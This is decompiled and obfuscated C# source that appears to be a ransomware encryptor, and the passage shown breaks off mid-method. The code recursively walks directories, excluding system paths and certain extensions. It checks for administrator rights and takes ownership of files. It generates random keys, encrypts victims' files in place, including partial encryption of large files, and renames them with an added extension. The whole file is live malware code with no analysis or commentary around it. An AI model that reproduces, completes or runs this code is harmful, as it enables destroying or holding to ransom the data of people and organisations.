using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using QFSLrCXCNYPIKJ;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using pLpOiMPKFBqsYEtBP;

namespace azCTgkmpGT;

internal sealed class ACJZwXMCdgNnIA
{
	public sealed class WfwjzXqMlnLKXBb
	{
		private static StringCollection UnvRrQGflzv;

		private static List<string> qGJAheLzWQw;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107349551));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107349546)) && !text.ToLower().Contains(getString_0(107349525)) && !text.ToLower().Contains(getString_0(107400928)) && !text.ToLower().Contains(getString_0(107400947)) && !text.ToLower().Contains(getString_0(107349512)) && !text.ToLower().Contains(getString_0(107401279)) && !text.ToLower().Contains(getString_0(107401220)) && !text.ToLower().Contains(getString_0(107401235)) && !text.ToLower().Contains(getString_0(107401186)) && !text.ToLower().Contains(getString_0(107401201)) && !text.ToLower().Contains(getString_0(107401167)) && !text.ToLower().Contains(getString_0(107401118)) && !text.ToLower().Contains(getString_0(107401133)) && !text.ToLower().Contains(getString_0(107401088)) && !text.ToLower().Contains(getString_0(107401099)) && !text.ToLower().Contains(getString_0(107400542)) && !text.ToLower().Contains(getString_0(107400561)) && !text.ToLower().Contains(getString_0(107400512)) && !text.ToLower().Contains(getString_0(107400527)) && !text.Contains(UJcPFgFtVJhWf(getString_0(107400478))) && !text.Contains(getString_0(107400453)) && !text.Contains(getString_0(107400440)) && !text.EndsWith(getString_0(107395309)) && !text.EndsWith(getString_0(107400415)) && !text.EndsWith(getString_0(107400410)) && !text.EndsWith(getString_0(107400437)) && !text.EndsWith(getString_0(107400432)) && !text.ToLower().Contains(getString_0(107400427)) && !text.ToLower().Contains(ZLERFztvScvXGTf))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(FoLsSeMcEVuV) * 1024.0 * 1024.0 && QotWPeyjvzjx == getString_0(107396875))
							{
								qGJAheLzWQw.Add(text);
							}
							else if (File.Exists(text) && QotWPeyjvzjx == getString_0(107397132))
							{
								qGJAheLzWQw.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return qGJAheLzWQw;
		}

		static WfwjzXqMlnLKXBb()
		{
			Strings.CreateGetStringDelegate(typeof(WfwjzXqMlnLKXBb));
			UnvRrQGflzv = new StringCollection();
			qGJAheLzWQw = new List<string>();
		}
	}

	private sealed class ltHpMWVMng
	{
		public string vjohKiJyzSRaUeWhX;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == vjohKiJyzSRaUeWhX;
		}
	}

	private sealed class RTucIAcuBRWMVl
	{
		public string ZNXHhLHxfberRP;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(PGvCWVOLTGYXz);
			eaZULefnOUcJVI.Add(getString_0(107400328) + ZNXHhLHxfberRP + getString_0(107396736) + (char)int_0 + getString_0(107349466));
			try
			{
				if (SidumIOOlYmWUm)
				{
					Console.WriteLine(getString_0(107400328) + ZNXHhLHxfberRP + getString_0(107396736) + (char)int_0 + getString_0(107349466));
				}
			}
			catch
			{
			}
		}

		static RTucIAcuBRWMVl()
		{
			Strings.CreateGetStringDelegate(typeof(RTucIAcuBRWMVl));
		}
	}

	private sealed class PeUIWwRFcyImzp
	{
		public string RSMlmXfaxX;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == RSMlmXfaxX;
		}
	}

	private sealed class wZZkvUzPbJZ
	{
		private sealed class pUBeQnAwpeWA
		{
			public wZZkvUzPbJZ KleysBRYbRu;

			public string QHcameMEDyksqkWY;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ncfdWMoQFofP(WindowsIdentity.GetCurrent().Name, QHcameMEDyksqkWY);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				jPSSNOQFeXu(QHcameMEDyksqkWY, KleysBRYbRu.CqITlEjkWXnTK, KleysBRYbRu.tNRwfpjZiNCOM, KleysBRYbRu.aFwtZhkyhonxJx, KleysBRYbRu.XXWrItZGjdyeN);
			}
		}

		public string[] CqITlEjkWXnTK;

		public string[] aFwtZhkyhonxJx;

		public string XXWrItZGjdyeN;

		public string tNRwfpjZiNCOM;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			pUBeQnAwpeWA CS_0024_003C_003E8__locals0 = new pUBeQnAwpeWA();
			CS_0024_003C_003E8__locals0.KleysBRYbRu = this;
			CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY = string_0;
			if (bTMUTlJGkGOO && !MVOTvzaISsBSX().Contains(getString_0(107397923)) && !MVOTvzaISsBSX().Contains(getString_0(107397851)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ncfdWMoQFofP(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (gsXyoeFOorGZ == getString_0(107396884))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					jPSSNOQFeXu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.KleysBRYbRu.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.KleysBRYbRu.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.KleysBRYbRu.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.KleysBRYbRu.XXWrItZGjdyeN);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				jPSSNOQFeXu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CqITlEjkWXnTK, tNRwfpjZiNCOM, aFwtZhkyhonxJx, XXWrItZGjdyeN);
			}
		}

		static wZZkvUzPbJZ()
		{
			Strings.CreateGetStringDelegate(typeof(wZZkvUzPbJZ));
		}
	}

	private sealed class MlhxfWYHvBPnrE
	{
		private sealed class tdXNNsWJFtDVWeIAq
		{
			public MlhxfWYHvBPnrE FBthsJRqPLob;

			public string XmJykDMKNMhzu;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (XmJykDMKNMhzu.ToLower().EndsWith(item + FBthsJRqPLob.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == getString_0(107396895))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(XmJykDMKNMhzu).Length)
						{
							try
							{
								hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402160), getString_0(107402155), getString_0(107402174), XmJykDMKNMhzu);
							}
							catch
							{
							}
						}
					}
					else if (XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107397152))
					{
						try
						{
							hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402160), getString_0(107402155), getString_0(107402174), XmJykDMKNMhzu);
						}
						catch
						{
						}
					}
				}
			}

			static tdXNNsWJFtDVWeIAq()
			{
				Strings.CreateGetStringDelegate(typeof(tdXNNsWJFtDVWeIAq));
			}
		}

		private sealed class UgmkrRPmQyDLrq
		{
			public MlhxfWYHvBPnrE FBthsJRqPLob;

			public string tDwFwsGDrP;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (tDwFwsGDrP.ToLower().EndsWith(item + FBthsJRqPLob.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == getString_0(107396898))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(tDwFwsGDrP).Length)
						{
							try
							{
								hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402163), getString_0(107402158), getString_0(107402177), tDwFwsGDrP);
							}
							catch
							{
							}
						}
					}
					else if (tDwFwsGDrP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107397155))
					{
						try
						{
							hIHAEKpEeiS.SRnkQsJyJfqDTNo(getString_0(107402163), getString_0(107402158), getString_0(107402177), tDwFwsGDrP);
						}
						catch
						{
						}
					}
				}
			}

			static UgmkrRPmQyDLrq()
			{
				Strings.CreateGetStringDelegate(typeof(UgmkrRPmQyDLrq));
			}
		}

		public List<string> pyrQmieHmmx;

		public List<string> aGPipPUJxaM;

		public string NWwyysQYwQDK;

		public string[] OyagJirLxGEcF;

		public string OxsDDfqLEi;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			tdXNNsWJFtDVWeIAq CS_0024_003C_003E8__locals0;
			foreach (string item in aGPipPUJxaM)
			{
				if (item.Contains(getString_0(107401052)) || item.Contains(getString_0(107401027)) || item.Contains(getString_0(107400994)) || item.ToLower().Contains(getString_0(107400945)) || item.ToLower().Contains(getString_0(107400964)) || item.Contains(getString_0(107400907)) || item.Contains(getString_0(107400886)) || item.ToLower().Contains(getString_0(107400873)) || item.ToLower().Contains(getString_0(107400892)) || item.ToLower().Contains(getString_0(107401335)) || item.ToLower().Contains(getString_0(107401326)) || item.ToLower().Contains(getString_0(107401341)) || item.ToLower().Contains(getString_0(107401315)) || item.ToLower().Contains(getString_0(107401262)) || item.Contains(getString_0(107401237)) || item.Contains(getString_0(107401252)) || item.Contains(getString_0(107401203)) || item.Contains(getString_0(107401218)) || item.Contains(getString_0(107401169)) || item.Contains(getString_0(107401184)) || item.Contains(getString_0(107401135)) || item.Contains(getString_0(107401150)) || item.Contains(getString_0(107401105)) || item.Contains(getString_0(107401116)) || item.ToLower().Contains(getString_0(107400559)) || item.ToLower().Contains(getString_0(107400578)) || item.ToLower().Contains(getString_0(107400529)) || item.ToLower().Contains(getString_0(107400544)) || item.Contains(UJcPFgFtVJhWf(getString_0(107400495))) || item.Contains(getString_0(107400470)) || item.Contains(getString_0(107396745)) || item.Contains(getString_0(107400457)) || item.EndsWith(NWwyysQYwQDK) || item.EndsWith(getString_0(107400432)) || item.EndsWith(getString_0(107400427)) || item.EndsWith(getString_0(107400454)) || item.EndsWith(getString_0(107400449)) || item.Contains(getString_0(107400444)) || item.Contains(ZLERFztvScvXGTf) || item.Contains(bDDJFCkjBbYQ) || item.Contains(IKRtRLOSqagD))
				{
					continue;
				}
				if (OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e93;
					}
				}
				try
				{
					if (item.EndsWith(NWwyysQYwQDK))
					{
						goto IL_0e93;
					}
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				if (!item.EndsWith(string_0) || JEkdiihxCoWf.Contains(item))
				{
					continue;
				}
				if (NgbDiBVJKDTW == getString_0(107396892))
				{
					try
					{
						if (gTLpLXyJzZQWL.MGCzqHggmAUsoR(item))
						{
							gTLpLXyJzZQWL.UibMaZyBJndO(item);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(item);
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(item)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(item));
				}
				wvGfPUgIYOBF(item);
				try
				{
					new hBrzirNLAz().GKYsKpmSoqlXyDMz(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(getString_0(107349507) + item + getString_0(107349430) + new FileInfo(item).Length + getString_0(107349441));
								Console.WriteLine(getString_0(107349432));
							}
						}
						catch
						{
						}
						avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107348783)), getString_0(107400328) + item + getString_0(107400328) + UJcPFgFtVJhWf(getString_0(107348758)) + getString_0(107400328) + Environment.UserName + getString_0(107400328) + UJcPFgFtVJhWf(getString_0(107348773)));
					}
				}
				catch (Exception ex2)
				{
					if (SWaMdrdKGgzowGl)
					{
						try
						{
							File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + item + getString_0(107348716) + ex2.Message + getString_0(107396659));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + item + getString_0(107348667) + ex4.Message + getString_0(107396659));
							}
							catch (Exception)
							{
							}
						}
						ZzaknwGiCeEd++;
						goto end_IL_0716;
					}
					if (krdgQbbXWsBnkAs == getString_0(107396892) && new FileInfo(item).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 && !pyrQmieHmmx.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new tdXNNsWJFtDVWeIAq();
						CS_0024_003C_003E8__locals0.FBthsJRqPLob = this;
						try
						{
							if (NWwyysQYwQDK != getString_0(107397805))
							{
								if (OtvlrYHFRq)
								{
									NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
								}
								File.Move(item, item + NWwyysQYwQDK);
							}
						}
						catch (Exception ex6)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + item + getString_0(107349118) + ex6.Message + getString_0(107396659));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = getString_0(107401596);
						if (NWwyysQYwQDK != getString_0(107397805))
						{
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = item + NWwyysQYwQDK;
						}
						else
						{
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = item;
						}
						if (pRibgXhmfietto == getString_0(107396892))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in tnUDcbYyevrzGRJA)
								{
									if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.FBthsJRqPLob.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == tdXNNsWJFtDVWeIAq.getString_0(107396895))
									{
										if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu).Length)
										{
											try
											{
												hIHAEKpEeiS.SRnkQsJyJfqDTNo(tdXNNsWJFtDVWeIAq.getString_0(107402160), tdXNNsWJFtDVWeIAq.getString_0(107402155), tdXNNsWJFtDVWeIAq.getString_0(107402174), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item2) && OGIisKmpnCtjYJtSZ == tdXNNsWJFtDVWeIAq.getString_0(107397152))
									{
										try
										{
											hIHAEKpEeiS.SRnkQsJyJfqDTNo(tdXNNsWJFtDVWeIAq.getString_0(107402160), tdXNNsWJFtDVWeIAq.getString_0(107402155), tdXNNsWJFtDVWeIAq.getString_0(107402174), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
						string text2 = getString_0(107401596);
						text2 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : getString_0(107401596));
						string s = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dhEsUcbXeBeyR == getString_0(107397149))
						{
							byte[] array = null;
							byte[] byte_ = PsMAbAPGwNaiG.jZLDTviUrm(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
							if (PsMAbAPGwNaiG.teuDisObNXw(ipZGIkDRDrXd: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), TTIkAHWRYFFqFLX: CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, ecklbfBlPisB: bytes))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + NWwyysQYwQDK, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!UpNccIaFzBadyA)
						{
							if (kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + NWwyysQYwQDK, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + NWwyysQYwQDK, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (OtvlrYHFRq)
					{
						NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
					}
					string text3 = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
					string text4 = getString_0(107401596);
					text4 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : getString_0(107401596));
					string s2 = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (NWwyysQYwQDK != getString_0(107397805))
					{
						if (!NbfRNVirWcO)
						{
							if (!UpNccIaFzBadyA)
							{
								QTDQnApWjFz(item, item + NWwyysQYwQDK, nQCMwcWKyQk);
							}
							else
							{
								QTDQnApWjFz(item, item + NWwyysQYwQDK, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!UpNccIaFzBadyA)
								{
									elqAHaVgaqSN(item, item + NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
								}
								else
								{
									elqAHaVgaqSN(item, item + NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + item + getString_0(107397823) + ex11.Message + getString_0(107396659));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								try
								{
									File.Move(item + NWwyysQYwQDK, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!NbfRNVirWcO)
					{
						if (!UpNccIaFzBadyA)
						{
							QTDQnApWjFz(item, item + getString_0(107397800), nQCMwcWKyQk);
						}
						else
						{
							QTDQnApWjFz(item, item + getString_0(107397800), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!UpNccIaFzBadyA)
							{
								elqAHaVgaqSN(item, item, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
							}
							else
							{
								elqAHaVgaqSN(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + item + getString_0(107397823) + ex14.Message + getString_0(107396659));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_0716;
						}
					}
					if (UpNccIaFzBadyA)
					{
						if (NWwyysQYwQDK != getString_0(107397805))
						{
							wTxBRYOuXVKuCY(item + NWwyysQYwQDK, bytes2);
						}
						else
						{
							wTxBRYOuXVKuCY(item, bytes2);
						}
					}
					goto IL_0e93;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				continue;
				IL_0e93:
				aGPipPUJxaM.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			UgmkrRPmQyDLrq CS_0024_003C_003E8__locals0 = new UgmkrRPmQyDLrq();
			CS_0024_003C_003E8__locals0.FBthsJRqPLob = this;
			CS_0024_003C_003E8__locals0.tDwFwsGDrP = string_0;
			if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401052)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401027)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400994)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400945)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400964)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400907)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400886)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400873)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400892)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401335)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401326)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401341)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401315)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401262)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401237)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401252)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401203)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401218)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401169)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401184)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401135)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401150)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401105)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401116)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400559)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400578)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400529)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400544)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(UJcPFgFtVJhWf(getString_0(107400495))) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400470)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107396745)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400457)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(NWwyysQYwQDK) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400432)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400427)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400454)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400449)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400444)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(ZLERFztvScvXGTf) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(bDDJFCkjBbYQ) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(IKRtRLOSqagD))
			{
				if (OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(NWwyysQYwQDK))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
				{
					if (NgbDiBVJKDTW == getString_0(107396892))
					{
						try
						{
							if (gTLpLXyJzZQWL.MGCzqHggmAUsoR(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
							{
								gTLpLXyJzZQWL.UibMaZyBJndO(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
							}
						}
						catch
						{
						}
					}
					JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP)))
					{
						IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP));
					}
					wvGfPUgIYOBF(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					try
					{
						new hBrzirNLAz().GKYsKpmSoqlXyDMz(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (SidumIOOlYmWUm)
								{
									Console.WriteLine(getString_0(107349507) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349430) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + getString_0(107349441));
									Console.WriteLine(getString_0(107349432));
								}
							}
							catch
							{
							}
							avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107348783)), getString_0(107400328) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107400328) + UJcPFgFtVJhWf(getString_0(107348758)) + getString_0(107400328) + Environment.UserName + getString_0(107400328) + UJcPFgFtVJhWf(getString_0(107348773)));
						}
					}
					catch (Exception ex2)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107348716) + ex2.Message + getString_0(107396659));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107348667) + ex4.Message + getString_0(107396659));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_085c_2;
						}
						if (krdgQbbXWsBnkAs == getString_0(107396892) && new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024)
						{
							try
							{
								if (NWwyysQYwQDK != getString_0(107397805))
								{
